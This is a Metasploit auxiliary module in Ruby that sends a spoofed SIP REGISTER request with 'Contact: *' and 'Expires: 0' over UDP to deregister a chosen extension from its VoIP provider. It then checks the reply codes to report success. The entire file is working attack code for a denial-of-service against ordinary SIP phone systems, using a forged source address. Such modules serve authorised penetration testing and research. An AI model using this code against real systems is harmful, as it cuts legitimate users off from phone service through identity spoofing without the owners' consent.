##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'SIP Deregister Extension',
			'Version'        => '$Revision$',
			'Description'    => 'This module will attempt to deregister the SIP user from the provider.',
			'Author'         => [ 'ChrisJohnRiley' ],
			'License'        =>  MSF_LICENSE
		)

		deregister_options('Proxies','SSL','RHOST')
		register_options(
			[
				Opt::RPORT(5060),
				OptString.new('SRCADDR', [true, "The sip address the spoofed call is coming from",'192.168.1.1']),
				OptString.new('EXTENSION', [true, "The specific extension or name to target", '100']),
				OptString.new('DOMAIN', [true, "Use a specific SIP domain", 'example.com'])
			],  self.class)
		register_advanced_options(
			[
				OptAddress.new('SIP_PROXY_NAME', [false, "Use a specific SIP proxy", nil]),
				OptPort.new('SIP_PROXY_PORT', [false, "SIP Proxy port to use", 5060])
			],  self.class)
	end


	def run_host(ip)

		begin

			src = datastore['SRCADDR']
			ext = datastore['EXTENSION']
			dom = datastore['DOMAIN']
			sphost = datastore['SIP_PROXY_NAME']
			spport = datastore['SIP_PROXY_PORT'] || 5060
			conn_string = "#{ext}@#{dom}"

			# set Route header if SIP_PROXY is set
			if not sphost.nil? and not sphost.empty?
				route = "Route: <sip:#{sphost}:#{spport};lr>\r\n"
			end

			connect_udp

			print_status("Sending deregistration packet to: #{conn_string}")
			print_status("Using SIP proxy #{sphost}:#{spport}") if route

			req =  "REGISTER sip:#{dom} SIP/2.0" + "\r\n"
			req << route if route 
			req << "Via: SIP/2.0/UDP #{src}" + "\r\n"
			req << "Max-Forwards: 70" +  "\r\n"
			req << "To: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
			req << "From: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
			req << "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
			req << "CSeq: 1 REGISTER" + "\r\n"
			req << "Contact: *" + "\r\n"
			req << "Expires: 0" + "\r\n"
			req << "Content-Length: 0" + "\r\n\r\n"

			udp_sock.put(req)

			while (r = udp_sock.recvfrom(65535, 3) and r[1])
				parse_reply(r)
			end

		rescue Errno::EACCES
		ensure 
			udp_sock.close if udp_sock
			disconnect_udp
		end

	end

	def parse_reply(pkt)
		# parse response to check if the ext was successfully de-registered

		if not pkt[1]
			print_error("No response received from remote host")
			return
		end

		if(pkt[1] =~ /^::ffff:/)
			pkt[1] = pkt[1].sub(/^::ffff:/, '')
		end

		resp  = pkt[0].split(/\s+/)[1]
		rhost,rport = pkt[1], pkt[2]

		if(pkt[0] =~ /^To\:\s*(.*)$/i)
			testn = "#{$1.strip}".split(';')[0]
		end

		case resp.to_i
		when 401
			print_error("Unable to de-register #{testn} [401 Unauthorised]")
		when 403
			print_error("Unable to de-register #{testn} [403 Forbidden]")
		when 200
			print_good("#{testn} de-registered [200 OK]")
		else
			print_error("#{testn} : Undefined error code #{resp.to_i}")
		end
	end

end
